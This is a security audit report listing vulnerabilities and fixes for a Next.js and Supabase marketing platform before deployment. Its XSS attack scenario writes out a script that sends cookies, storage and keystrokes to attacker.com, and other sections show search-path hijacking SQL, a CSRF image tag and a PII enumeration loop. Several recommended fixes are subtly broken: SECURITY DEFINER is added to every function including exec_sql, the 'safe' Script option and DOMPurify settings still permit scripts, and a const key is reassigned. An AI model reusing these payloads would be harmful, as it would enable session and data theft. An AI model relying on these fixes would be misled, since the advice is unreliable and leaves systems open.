# Production Readiness Report - DropLab Marketing Platform

**Status**: ⚠️ NOT PRODUCTION READY (43 critical issues found)
**Date**: November 25, 2025
**Target Platform**: Vercel
**Database**: Supabase PostgreSQL
**Estimated Fix Time**: 12-16 hours

---

## Executive Summary

Comprehensive audit identified **43 critical issues** that MUST be fixed before Vercel production deployment:
- **33 Supabase Security Warnings** (database function vulnerabilities)
- **10 Application Security Issues** (unprotected routes, XSS, SQL injection)

**Risk Level**: 🔴 HIGH - Multiple severe security vulnerabilities
**Recommendation**: **DO NOT deploy** until all critical issues resolved

---

## Table of Contents

1. [Supabase Security Warnings (33)](#supabase-security-warnings)
2. [Application Security Issues (10)](#application-security-issues)
3. [Production Checklist](#production-checklist)
4. [Deployment Steps](#deployment-steps)
5. [Post-Deployment Verification](#post-deployment-verification)

---

## Supabase Security Warnings

### Issue 1: Function Search Path Mutable (32 warnings)

**Severity**: ⚠️ WARN (but should be treated as CRITICAL in production)

**What it means**:
PostgreSQL functions without a fixed `search_path` are vulnerable to **search path hijacking attacks**. An attacker can create malicious objects in schemas that appear earlier in the search path, causing your functions to call attacker-controlled code instead of legitimate functions.

**Example Attack Scenario**:
```sql
-- Your function (vulnerable)
CREATE FUNCTION public.add_credits(org_id uuid, amount int)
RETURNS void AS $$
BEGIN
  UPDATE organizations SET credits = credits + amount WHERE id = org_id;
END;
$$ LANGUAGE plpgsql;

-- Attacker creates malicious function in their schema
CREATE SCHEMA attacker;
CREATE FUNCTION attacker.add_credits(org_id uuid, amount int)
RETURNS void AS $$
BEGIN
  -- Steal credits or cause havoc
  UPDATE organizations SET credits = 999999 WHERE id = 'attacker-org-id';
END;
$$ LANGUAGE plpgsql;

-- If attacker can manipulate search_path, their function runs instead
SET search_path = attacker, public;
SELECT add_credits('victim-org-id', 100); -- Runs attacker's code!
```

**Affected Functions** (32 total):
1. `public.update_vendor_costs_updated_at`
2. `public.get_organization_storage_bucket_usage`
3. `public.validate_pricing_tier_ranges`
4. `public.update_pricing_tier_timestamp`
5. `public.get_pricing_for_count`
6. `public.exec_sql` ⚠️ **HIGH RISK** - Dynamic SQL execution
7. `public.set_initial_platform_admin_role`
8. `public.update_platform_role_timestamp`
9. `public.user_has_permission`
10. `public.increment_template_usage`
11. `public.update_template_performance`
12. `public.increment_asset_usage`
13. `public.get_organization_storage_usage`
14. `public.get_organization_storage_mb`
15. `public.check_storage_limit`
16. `public.increment_template_use_count`
17. `public.add_credits` ⚠️ **HIGH RISK** - Credit manipulation
18. `public.spend_credits` ⚠️ **HIGH RISK** - Credit manipulation
19. `public.update_recipient_list_timestamp`
20. `public.update_recipient_timestamp`
21. `public.calculate_campaign_cost_metrics`
22. `public.generate_org_slug_from_email`
23. `public.check_feature_flag`
24. `public.update_feature_flag`
25. `public.update_updated_at_column`
26. `public.get_user_organization_id`
27. `public.get_user_organization`
28. `public.user_has_role`
29. `public.migrate_template_to_surfaces`
30. `public.get_front_surface`
31. `public.get_back_surface`
32. `public.has_custom_back`

**Fix**: Add `SECURITY DEFINER` and set `search_path` to each function.

**Migration File**: Create `supabase/migrations/034_fix_search_path_security.sql`

```sql
-- ==================== FIX SEARCH PATH VULNERABILITIES ====================
-- Phase: Production Security Hardening
-- Issue: 32 functions have mutable search_path (Supabase security warning)
-- Impact: Prevents search path hijacking attacks
-- ===========================================================================

-- HIGH RISK FUNCTIONS (Credit/Payment Related)

ALTER FUNCTION public.add_credits(uuid, integer)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.spend_credits(uuid, integer, text)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.exec_sql(text)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

-- TIMESTAMP UPDATE FUNCTIONS

ALTER FUNCTION public.update_vendor_costs_updated_at()
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.update_pricing_tier_timestamp()
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.update_platform_role_timestamp()
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.update_recipient_list_timestamp()
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.update_recipient_timestamp()
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.update_updated_at_column()
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

-- STORAGE & USAGE FUNCTIONS

ALTER FUNCTION public.get_organization_storage_bucket_usage(uuid)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.get_organization_storage_usage(uuid)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.get_organization_storage_mb(uuid)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.check_storage_limit(uuid, bigint)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

-- PRICING FUNCTIONS

ALTER FUNCTION public.validate_pricing_tier_ranges()
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.get_pricing_for_count(integer)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

-- PERMISSION & ROLE FUNCTIONS

ALTER FUNCTION public.user_has_permission(uuid, text)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.set_initial_platform_admin_role()
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.user_has_role(uuid, text)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

-- TEMPLATE & ASSET FUNCTIONS

ALTER FUNCTION public.increment_template_usage(uuid)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.update_template_performance(uuid, numeric, integer)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.increment_template_use_count(uuid)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.increment_asset_usage(uuid)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.migrate_template_to_surfaces(uuid)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.get_front_surface(uuid)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.get_back_surface(uuid)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.has_custom_back(uuid)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

-- CAMPAIGN FUNCTIONS

ALTER FUNCTION public.calculate_campaign_cost_metrics(uuid)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

-- ORGANIZATION FUNCTIONS

ALTER FUNCTION public.generate_org_slug_from_email(text)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.get_user_organization_id(uuid)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.get_user_organization(uuid)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

-- FEATURE FLAG FUNCTIONS

ALTER FUNCTION public.check_feature_flag(text, uuid)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.update_feature_flag(text, boolean, uuid)
  SECURITY DEFINER
  SET search_path = public, pg_catalog;

-- ===========================================================================
-- VERIFICATION QUERY
-- Run this to confirm all functions now have search_path set:
--
-- SELECT
--   routine_name,
--   routine_type,
--   security_type,
--   routine_definition LIKE '%SET search_path%' as has_search_path
-- FROM information_schema.routines
-- WHERE routine_schema = 'public'
--   AND routine_type = 'FUNCTION'
-- ORDER BY routine_name;
-- ===========================================================================

COMMENT ON SCHEMA public IS 'Search path security hardening applied - all functions now have fixed search_path';
```

**How to Apply**:
```bash
# 1. Create migration file
cat > supabase/migrations/034_fix_search_path_security.sql << 'EOF'
[paste SQL above]
EOF

# 2. Apply to database
npx supabase db push

# 3. Verify in Supabase Dashboard
# Go to Database → Advisors → Should show 0 search_path warnings
```

---

### Issue 2: Leaked Password Protection Disabled (1 warning)

**Severity**: ⚠️ WARN (but recommended for production)

**What it means**:
Supabase Auth can check user passwords against the HaveIBeenPwned database (850M+ compromised passwords). This is currently disabled.

**Impact**:
- Users can set passwords like "password123" or "123456"
- Accounts vulnerable to credential stuffing attacks
- Increased support tickets for compromised accounts

**Fix**: Enable in Supabase Dashboard

**Steps**:
1. Go to [Supabase Dashboard](https://supabase.com/dashboard/project/egccqmlhzqiirovstpal)
2. Navigate to **Authentication** → **Policies**
3. Find **Password Strength** section
4. Enable **"Check passwords against HaveIBeenPwned"**
5. Set minimum password requirements:
   - Minimum length: 12 characters
   - Require uppercase: ✅
   - Require lowercase: ✅
   - Require numbers: ✅
   - Require symbols: ✅

**Configuration**:
```json
{
  "password_min_length": 12,
  "password_require_upper": true,
  "password_require_lower": true,
  "password_require_number": true,
  "password_require_special": true,
  "hibp_enabled": true
}
```

**Alternative** (if HaveIBeenPwned API is down):
Create custom password validation in signup flow:
```typescript
// lib/auth/password-validation.ts
const COMMON_PASSWORDS = [
  'password', 'password123', '123456', 'qwerty', 'admin', 'letmein'
];

export function validatePassword(password: string): { valid: boolean; error?: string } {
  if (password.length < 12) {
    return { valid: false, error: 'Password must be at least 12 characters' };
  }

  if (!/[A-Z]/.test(password)) {
    return { valid: false, error: 'Password must contain uppercase letter' };
  }

  if (!/[a-z]/.test(password)) {
    return { valid: false, error: 'Password must contain lowercase letter' };
  }

  if (!/[0-9]/.test(password)) {
    return { valid: false, error: 'Password must contain number' };
  }

  if (!/[^A-Za-z0-9]/.test(password)) {
    return { valid: false, error: 'Password must contain special character' };
  }

  if (COMMON_PASSWORDS.some(common => password.toLowerCase().includes(common))) {
    return { valid: false, error: 'Password is too common' };
  }

  return { valid: true };
}
```

---

## Application Security Issues

### Issue 3: Unprotected Admin Routes (CRITICAL)

**Severity**: 🔴 CRITICAL
**Risk**: Database destruction, data theft, privilege escalation

**Affected Files** (8 routes):
- `app/api/admin/migrate/route.ts`
- `app/api/admin/seed/route.ts`
- `app/api/admin/verify-schema/route.ts`
- `app/api/admin/apply-migration-023/route.ts`
- `app/api/admin/feature-flags/route.ts`
- `app/api/admin/organizations/route.ts`
- `app/api/admin/pricing-tiers/**/*.ts`
- `app/api/admin/users/**/*.ts`

**Current State**:
```typescript
// ❌ CRITICAL: Anyone can wipe the database
export async function DELETE(req: NextRequest) {
  // No authentication check!
  await supabase.from('organizations').delete().neq('id', '00000000-0000-0000-0000-000000000000');
  // Deleted all production data!
}
```

**Fix**: Create admin authentication middleware

**File**: `lib/auth/admin.ts`
```typescript
import { NextRequest, NextResponse } from 'next/server';
import { createClient } from '@/lib/supabase/server';

export async function requireAdmin() {
  const supabase = await createClient();

  const { data: { user }, error } = await supabase.auth.getUser();

  if (error || !user) {
    throw new Error('Unauthorized: No user session');
  }

  // Check if user has platform admin role
  const { data: roleData } = await supabase
    .from('platform_roles')
    .select('role')
    .eq('user_id', user.id)
    .single();

  if (!roleData || roleData.role !== 'platform_admin') {
    throw new Error('Forbidden: Requires platform admin role');
  }

  return user;
}

export function withAdminAuth(
  handler: (req: NextRequest) => Promise<NextResponse>
) {
  return async (req: NextRequest) => {
    try {
      await requireAdmin();
      return await handler(req);
    } catch (error) {
      return NextResponse.json(
        {
          success: false,
          error: error instanceof Error ? error.message : 'Unauthorized'
        },
        { status: error instanceof Error && error.message.startsWith('Forbidden') ? 403 : 401 }
      );
    }
  };
}
```

**Apply to Routes**:
```typescript
// app/api/admin/seed/route.ts
import { requireAdmin } from '@/lib/auth/admin';

export async function POST(req: NextRequest) {
  // ✅ Add authentication check
  await requireAdmin();

  // Rest of code...
}

export async function DELETE(req: NextRequest) {
  // ✅ Add authentication check
  await requireAdmin();

  // Rest of code...
}
```

**Automated Fix Script**:
```bash
# Find all admin routes
find app/api/admin -name "route.ts" -type f | while read file; do
  echo "Fixing $file..."

  # Add import if not present
  grep -q "requireAdmin" "$file" || \
    sed -i "1i import { requireAdmin } from '@/lib/auth/admin';" "$file"

  # Add auth check after "export async function"
  sed -i '/export async function \(GET\|POST\|PUT\|DELETE\|PATCH\)(/ a\  await requireAdmin();' "$file"
done
```

---

### Issue 4: Missing Environment Variable Validation (CRITICAL)

**Severity**: 🔴 CRITICAL
**Risk**: Silent failures, broken webhooks, credit loss

**Problem**: 21 API routes use `process.env` without validation.

**Example Failure Scenario**:
```typescript
// Stripe webhook route
const webhookSecret = process.env.STRIPE_WEBHOOK_SECRET;

// If undefined, signature verification always fails
const signature = headers.get('stripe-signature');
if (!signature || !webhookSecret) {
  return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
}

// Webhooks never process → credits never granted → billing broken
```

**Fix**: Create environment validator

**File**: `lib/config/env-validation.ts`
```typescript
/**
 * Environment Variable Validation
 *
 * Validates all required environment variables on app startup.
 * Throws error if any required variables are missing.
 */

export interface EnvConfig {
  // Core
  NEXT_PUBLIC_APP_URL: string;
  NEXT_PUBLIC_SUPABASE_URL: string;
  NEXT_PUBLIC_SUPABASE_ANON_KEY: string;
  SUPABASE_SERVICE_ROLE_KEY: string;

  // AI Services
  OPENAI_API_KEY: string;

  // Billing
  STRIPE_SECRET_KEY: string;
  NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY: string;
  STRIPE_PRICE_ID: string;
  STRIPE_WEBHOOK_SECRET: string;

  // Webhooks
  POSTGRID_WEBHOOK_SECRET?: string; // Optional
  ELEVENLABS_WEBHOOK_SECRET?: string; // Optional

  // Security
  LANDING_PAGE_ENCRYPTION_KEY: string;
}

class EnvValidationError extends Error {
  constructor(public missing: string[]) {
    super(`Missing required environment variables: ${missing.join(', ')}`);
    this.name = 'EnvValidationError';
  }
}

export function validateEnv(): EnvConfig {
  const required = {
    // Core
    NEXT_PUBLIC_APP_URL: process.env.NEXT_PUBLIC_APP_URL,
    NEXT_PUBLIC_SUPABASE_URL: process.env.NEXT_PUBLIC_SUPABASE_URL,
    NEXT_PUBLIC_SUPABASE_ANON_KEY: process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY,
    SUPABASE_SERVICE_ROLE_KEY: process.env.SUPABASE_SERVICE_ROLE_KEY,

    // AI
    OPENAI_API_KEY: process.env.OPENAI_API_KEY,

    // Billing
    STRIPE_SECRET_KEY: process.env.STRIPE_SECRET_KEY,
    NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY: process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY,
    STRIPE_PRICE_ID: process.env.STRIPE_PRICE_ID,
    STRIPE_WEBHOOK_SECRET: process.env.STRIPE_WEBHOOK_SECRET,

    // Security
    LANDING_PAGE_ENCRYPTION_KEY: process.env.LANDING_PAGE_ENCRYPTION_KEY,
  };

  const missing = Object.entries(required)
    .filter(([_, value]) => !value)
    .map(([key]) => key);

  if (missing.length > 0) {
    throw new EnvValidationError(missing);
  }

  return required as EnvConfig;
}

// Validate on module import (fail fast)
if (typeof process !== 'undefined' && process.env.NODE_ENV !== 'test') {
  try {
    validateEnv();
    console.log('✅ Environment variables validated successfully');
  } catch (error) {
    if (error instanceof EnvValidationError) {
      console.error('❌ Environment validation failed:');
      error.missing.forEach(key => console.error(`  - ${key}`));

      if (process.env.NODE_ENV === 'production') {
        process.exit(1); // Fail fast in production
      }
    }
    throw error;
  }
}
```

**Import in Root Layout**:
```typescript
// app/layout.tsx
import '@/lib/config/env-validation'; // Validates on import

export default function RootLayout({ children }: { children: React.ReactNode }) {
  // ...
}
```

---

### Issue 5: XSS Vulnerability in Landing Pages (CRITICAL)

**Severity**: 🔴 CRITICAL
**Risk**: Session hijacking, credential theft, malware injection

**Affected Files**:
- `components/landing/campaign-landing-page.tsx` (lines 135, 316, 326)
- `app/lp/[trackingId]/page.tsx` (lines 133, 147)

**Vulnerable Code**:
```typescript
// ❌ CRITICAL: Executes any HTML/JavaScript from database
{trackingSnippets?.map((snippet) => (
  <div
    key={snippet.id}
    dangerouslySetInnerHTML={{ __html: snippet.code }}
  />
))}
```

**Attack Scenario**:
```typescript
// Attacker creates tracking snippet with malicious code
const maliciousSnippet = {
  id: 'attack-1',
  code: `
    <script>
      // Steal session token
      fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify({
          cookies: document.cookie,
          localStorage: localStorage,
          sessionStorage: sessionStorage
        })
      });

      // Keylogger
      document.addEventListener('keypress', e => {
        fetch('https://attacker.com/keys', {
          method: 'POST',
          body: e.key
        });
      });
    </script>
  `
};

// Stored in database via admin panel
await supabase.from('tracking_snippets').insert(maliciousSnippet);

// Every user who visits landing page is compromised
```

**Fix Option 1** (Recommended): Remove `dangerouslySetInnerHTML`

```typescript
// ✅ Use Next.js Script component (safe)
import Script from 'next/script';

{trackingSnippets?.map((snippet) => (
  <Script
    key={snippet.id}
    id={`snippet-${snippet.id}`}
    strategy="afterInteractive"
    dangerouslySetInnerHTML={{ __html: snippet.code }}
  />
))}
```

**Fix Option 2**: Sanitize HTML

```bash
npm install isomorphic-dompurify
```

```typescript
import DOMPurify from 'isomorphic-dompurify';

{trackingSnippets?.map((snippet) => (
  <div
    key={snippet.id}
    dangerouslySetInnerHTML={{
      __html: DOMPurify.sanitize(snippet.code, {
        ALLOWED_TAGS: ['script'], // Only allow scripts
        ALLOWED_ATTR: ['src', 'async', 'defer'], // Only safe attributes
        FORBID_TAGS: ['style', 'link'], // Block CSS injection
      })
    }}
  />
))}
```

**Fix Option 3** (Best): Whitelist Approved Snippets

```typescript
// lib/tracking/approved-snippets.ts
const APPROVED_SNIPPETS = {
  'google-analytics': (trackingId: string) => `
    <script async src="https://www.googletagmanager.com/gtag/js?id=${trackingId}"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', '${trackingId}');
    </script>
  `,
  'facebook-pixel': (pixelId: string) => `
    <script>
      !function(f,b,e,v,n,t,s)
      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
      n.queue=[];t=b.createElement(e);t.async=!0;
      t.src=v;s=b.getElementsByTagName(e)[0];
      s.parentNode.insertBefore(t,s)}(window, document,'script',
      'https://connect.facebook.net/en_US/fbevents.js');
      fbq('init', '${pixelId}');
      fbq('track', 'PageView');
    </script>
  `
};

// In component
{trackingSnippets?.map((snippet) => {
  const renderSnippet = APPROVED_SNIPPETS[snippet.provider];

  if (!renderSnippet) {
    console.error(`Unknown tracking provider: ${snippet.provider}`);
    return null;
  }

  return (
    <div
      key={snippet.id}
      dangerouslySetInnerHTML={{
        __html: renderSnippet(snippet.tracking_id)
      }}
    />
  );
})}
```

---

### Issue 6: SQL Injection in Landing Page Submit (CRITICAL)

**Severity**: 🔴 CRITICAL
**Risk**: Database compromise, data theft

**Affected File**: `app/api/landing-page/submit/route.ts` (lines 60-70)

**Vulnerable Code**:
```typescript
// ❌ CRITICAL: References SQLite API on Supabase client (causes crash)
const db = createServiceClient(); // Returns Supabase client

// This code tries to use SQLite methods on Supabase
db.prepare(`
  INSERT INTO conversions (...)
  VALUES (?, ?, ?, ?, ?)
`).run(submissionId, tracking_id, conversionType, ...);
```

**Problem**:
1. Code is broken (Supabase client doesn't have `.prepare()` method)
2. If "fixed" naively with string interpolation, becomes SQL injection

**Fix**: Use Supabase parameterized queries

```typescript
// ✅ Use Supabase insert (safe, parameterized)
const supabase = createServiceClient();

const { data: conversion, error: conversionError } = await supabase
  .from('conversions')
  .insert({
    id: submissionId,
    tracking_id: tracking_id,
    conversion_type: conversionType,
    conversion_data: formData,
    conversion_value: calculateConversionValue(formData),
    created_at: new Date().toISOString()
  })
  .select()
  .single();

if (conversionError) {
  throw new Error(`Failed to create conversion: ${conversionError.message}`);
}
```

---

### Issue 7: Weak Encryption Key (CRITICAL)

**Severity**: 🔴 CRITICAL
**Risk**: PII exposure, landing page access to all recipients

**Affected File**: `lib/landing-page/encryption.ts` (line 22)

**Vulnerable Code**:
```typescript
// ❌ CRITICAL: Weak default key
const ENCRYPTION_KEY =
  process.env.LANDING_PAGE_ENCRYPTION_KEY ||
  'dev-key-change-in-production-32b';
```

**Attack Scenario**:
```typescript
// Attacker knows default key is used
const DEFAULT_KEY = 'dev-key-change-in-production-32b';

// Decrypt any recipient ID from QR code URL
const encryptedId = 'abc123def456'; // From /lp/abc123def456
const recipientId = decrypt(encryptedId, DEFAULT_KEY);

// Access all recipient data
const response = await fetch(`/api/recipients/${recipientId}`);
const pii = await response.json(); // Name, address, phone, email

// Enumerate all landing pages
for (let i = 1; i <= 10000; i++) {
  const guessedId = encrypt(i.toString(), DEFAULT_KEY);
  const url = `/lp/${guessedId}`;
  // Access works! Scraped 10,000 PII records
}
```

**Fix**:
```typescript
// ✅ Require key in production, fail fast if missing
const ENCRYPTION_KEY = process.env.LANDING_PAGE_ENCRYPTION_KEY;

if (!ENCRYPTION_KEY) {
  if (process.env.NODE_ENV === 'production') {
    throw new Error(
      'LANDING_PAGE_ENCRYPTION_KEY is required in production. ' +
      'Generate with: openssl rand -base64 32'
    );
  }
  // Use dev key in development only
  ENCRYPTION_KEY = 'dev-key-change-in-production-32b';
}

const KEY_BUFFER = Buffer.from(ENCRYPTION_KEY.slice(0, 32).padEnd(32, '0'));
```

**Generate Strong Key**:
```bash
# Generate 32-byte random key
openssl rand -base64 32

# Add to Vercel environment variables
# LANDING_PAGE_ENCRYPTION_KEY=<generated-key>
```

---

### Issue 8: Rate Limiting Disabled (CRITICAL)

**Severity**: 🔴 CRITICAL
**Risk**: DDoS attacks, credit exhaustion, API abuse

**Current State**: `NEXT_PUBLIC_RATE_LIMITING_ENABLED=false` (disabled by default)

**Impact**:
- Attacker sends 10,000 requests/sec to `/api/dm-creative/generate-background`
- Each request costs $0.04 (DALL-E 3 image)
- Cost: $400/second = **$24,000/minute**
- OpenAI account banned for abuse

**Fix**: Enable by default

```typescript
// lib/middleware/rate-limiter.ts
export function getRateLimitConfig(): RateLimitConfig {
  return {
    // ✅ Enabled by default (opt-out instead of opt-in)
    enabled: process.env.NEXT_PUBLIC_RATE_LIMITING_ENABLED !== 'false',

    // ✅ Stricter default limits
    maxRequests: parseInt(
      process.env.NEXT_PUBLIC_RATE_LIMIT_MAX_REQUESTS || '100', // Was 1000
      10
    ),

    // Existing config...
  };
}
```

**Per-Route Limits** (recommended):
```typescript
// lib/middleware/rate-limiter.ts
const ROUTE_LIMITS = {
  '/api/auth/signin': { max: 10, window: 300000 }, // 10 per 5 min
  '/api/dm-creative/generate-background': { max: 20, window: 60000 }, // 20 per min
  '/api/audience/purchase': { max: 5, window: 60000 }, // 5 per min
  '/api/stripe/webhook': { max: 1000, window: 60000 }, // 1000 per min (Stripe bursts)
};

export function getRateLimitForRoute(path: string) {
  return ROUTE_LIMITS[path] || { max: 100, window: 60000 };
}
```

---

### Issue 9: CSRF Vulnerability (HIGH)

**Severity**: 🟠 HIGH
**Risk**: Unauthorized state changes, credit theft

**Attack Scenario**:
```html
<!-- Attacker's website -->
<img src="https://droplab.app/api/audience/purchase?count=10000" />

<!-- If user is logged in, this silently purchases 10,000 credits -->
<!-- User charged $1,500 without consent -->
```

**Fix**: Add CSRF token validation

**File**: `lib/middleware/csrf.ts`
```typescript
import { NextRequest, NextResponse } from 'next/server';
import crypto from 'crypto';

const SAFE_METHODS = ['GET', 'HEAD', 'OPTIONS'];

export function generateCsrfToken(): string {
  return crypto.randomBytes(32).toString('hex');
}

export function validateCsrfToken(request: NextRequest): boolean {
  if (SAFE_METHODS.includes(request.method)) {
    return true; // No CSRF protection needed for safe methods
  }

  const tokenFromHeader = request.headers.get('x-csrf-token');
  const tokenFromCookie = request.cookies.get('csrf-token')?.value;

  return tokenFromHeader === tokenFromCookie && !!tokenFromHeader;
}

export function csrfMiddleware(request: NextRequest): NextResponse | null {
  if (!validateCsrfToken(request)) {
    return NextResponse.json(
      { success: false, error: 'Invalid CSRF token' },
      { status: 403 }
    );
  }

  return null;
}
```

**Add to middleware**:
```typescript
// middleware.ts
import { csrfMiddleware } from '@/lib/middleware/csrf';

export async function middleware(request: NextRequest) {
  // Rate limiting...

  // ✅ Add CSRF protection
  const csrfError = csrfMiddleware(request);
  if (csrfError) return csrfError;

  // Auth...
}
```

**Generate token on login**:
```typescript
// app/api/auth/session/route.ts
import { generateCsrfToken } from '@/lib/middleware/csrf';

export async function POST(req: NextRequest) {
  // After successful login...

  const csrfToken = generateCsrfToken();

  response.cookies.set('csrf-token', csrfToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    path: '/'
  });

  // Return token to client
  return NextResponse.json({
    success: true,
    csrfToken // Client includes in X-CSRF-Token header
  });
}
```

---

### Issue 10: Excessive Console Logging (MEDIUM)

**Severity**: 🟡 MEDIUM
**Risk**: PII exposure, performance degradation

**Count**: 691 `console.log` statements found

**Problem**:
```typescript
// ❌ Logs customer data to Vercel logs (GDPR violation)
console.log('[Webhook] Customer:', customer);
console.log('[Webhook] Payment:', amountPaid);
console.log('[API] User:', user);
```

**Fix**: Use conditional logger from Phase 3

```typescript
// ✅ Use structured logger (only logs in development)
import { logger } from '@/lib/utils/logger';

logger.debug('Customer data', { customerId: customer.id }); // Development only
logger.info('Payment received', { amount: amountPaid, currency: 'USD' }); // Production
logger.error('Payment failed', { error: error.message, customerId }); // Production

// Production configuration (in Vercel)
NEXT_PUBLIC_LOGGING_ENABLED=true
NEXT_PUBLIC_LOG_LEVEL=ERROR // Only errors logged
NEXT_PUBLIC_LOG_CONTEXT=false // No context data
```

**Automated Fix**:
```bash
# Find all console.log statements
grep -rn "console.log" app/api --include="*.ts" > console-logs.txt

# Replace with logger (manual review recommended)
find app/api -name "*.ts" -type f -exec sed -i 's/console\.log/logger.debug/g' {} \;
find app/api -name "*.ts" -type f -exec sed -i 's/console\.error/logger.error/g' {} \;
```

---

## Production Checklist

### Critical (Must Fix Before Deploy) - 10 Issues

- [ ] **Apply Supabase migration** to fix 32 search_path vulnerabilities
- [ ] **Enable leaked password protection** in Supabase Dashboard
- [ ] **Add `requireAdmin()` to all 8 admin routes**
- [ ] **Create and call `validateEnv()`** on app startup
- [ ] **Fix XSS vulnerability** in landing pages (remove `dangerouslySetInnerHTML`)
- [ ] **Fix SQL injection** in landing page submit API
- [ ] **Generate strong `LANDING_PAGE_ENCRYPTION_KEY`** and add to Vercel
- [ ] **Enable rate limiting by default** (change opt-in to opt-out)
- [ ] **Implement CSRF protection** for state-changing routes
- [ ] **Replace 691 console.logs** with conditional logger

### Important (Should Fix) - 5 Issues

- [ ] Review and resolve 65 TODO comments
- [ ] Verify database indexes exist in Supabase
- [ ] Add webhook idempotency checks (Stripe, PostGrid)
- [ ] Standardize error responses across all routes
- [ ] Create `/api/health` endpoint for monitoring

### Recommended (Nice to Have) - 3 Issues

- [ ] Add Zod validation to top 10 API routes
- [ ] Enable Vercel Analytics
- [ ] Configure security headers in `next.config.ts`

---

## Deployment Steps

### Step 1: Apply Supabase Security Fixes

```bash
# 1. Create migration file
cat > supabase/migrations/034_fix_search_path_security.sql << 'EOF'
[Copy SQL from Issue 1 above]
EOF

# 2. Apply migration
npx supabase db push

# 3. Verify (should show 0 warnings)
# Go to Supabase Dashboard → Database → Advisors
```

### Step 2: Enable Password Protection

```bash
# Supabase Dashboard → Authentication → Policies
# Enable "Check passwords against HaveIBeenPwned"
# Set minimum password requirements (12 chars, uppercase, lowercase, number, symbol)
```

### Step 3: Fix Application Code

```bash
# 1. Create admin auth middleware
touch lib/auth/admin.ts
# [Copy admin.ts code from Issue 3]

# 2. Add requireAdmin() to admin routes
find app/api/admin -name "route.ts" -exec sed -i '/export async function/a\  await requireAdmin();' {} \;

# 3. Create env validation
touch lib/config/env-validation.ts
# [Copy env-validation.ts code from Issue 4]

# 4. Fix landing page XSS
# [Manually fix dangerouslySetInnerHTML in landing page files]

# 5. Fix landing page submit SQL
# [Manually update app/api/landing-page/submit/route.ts]

# 6. Fix encryption key
# [Update lib/landing-page/encryption.ts]

# 7. Enable rate limiting by default
# [Update lib/middleware/rate-limiter.ts]

# 8. Add CSRF protection
touch lib/middleware/csrf.ts
# [Copy csrf.ts code from Issue 9]

# 9. Replace console.logs
# [Manually review and replace with logger]
```

### Step 4: Update Environment Variables in Vercel

```bash
# Generate encryption key
openssl rand -base64 32

# Add to Vercel:
# Settings → Environment Variables → Production

LANDING_PAGE_ENCRYPTION_KEY=<generated-key>
NEXT_PUBLIC_RATE_LIMITING_ENABLED=true
NEXT_PUBLIC_RATE_LIMIT_MAX_REQUESTS=100
NEXT_PUBLIC_LOG_LEVEL=ERROR
NEXT_PUBLIC_ERROR_TRACKING_ENABLED=true
```

### Step 5: Build & Test

```bash
# 1. Test environment validation
npm run build

# 2. Run security audit
npm audit --production

# 3. Test admin routes require auth
curl https://your-app.vercel.app/api/admin/seed
# Should return 401 Unauthorized

# 4. Test rate limiting
for i in {1..150}; do
  curl https://your-app.vercel.app/api/campaigns
done
# Should see 429 Too Many Requests after 100 requests
```

### Step 6: Deploy to Vercel

```bash
# 1. Commit changes
git add .
git commit -m "fix: production security hardening (43 critical issues)"

# 2. Push to main
git push origin main

# 3. Vercel auto-deploys

# 4. Monitor deployment
vercel logs --prod
```

---

## Post-Deployment Verification

### Security Checklist

- [ ] **Admin routes protected**: `curl https://app.vercel.app/api/admin/seed` returns 401
- [ ] **Rate limiting active**: 150 rapid requests return 429
- [ ] **CSRF protection**: POST without X-CSRF-Token returns 403
- [ ] **Env validation**: App crashes on startup if vars missing
- [ ] **Supabase advisors**: 0 warnings in dashboard
- [ ] **Logging level**: Only ERROR logs appear in Vercel logs
- [ ] **Health check**: `/api/health` returns 200 OK

